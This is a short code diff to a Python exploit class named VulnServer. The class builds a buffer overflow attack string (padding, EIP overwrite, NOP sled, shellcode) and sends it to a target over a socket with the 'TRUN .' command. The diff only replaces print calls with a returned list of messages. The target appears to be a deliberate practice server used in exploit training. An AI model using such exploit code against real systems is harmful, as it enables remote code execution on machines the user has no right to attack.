@@ -40,18 +40,24 @@ class VulnServer():
         self.attack_string = self.buffer + self.eip + self.nop_sled + self.shellcode + self.final_pad 
 
     def exploit(self):
+
+        results = []
+
         try:
 
-            print('[*] Creating socket connection')
+            results.append('[*] Creating socket connection')
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
             s.connect((self.ip,self.port))
             s.recv(1024)
 
-            print('[*] Sending payload')
+            results.append('[*] Sending payload')
             s.send(b'TRUN .' + self.attack_string + b'\r\n')
     
             s.close()
 
         except Exception as e:
-            print('There was an error: ' + str(e))
+            results.append('[-] ' + str(e))
+
+        finally:
+            return results
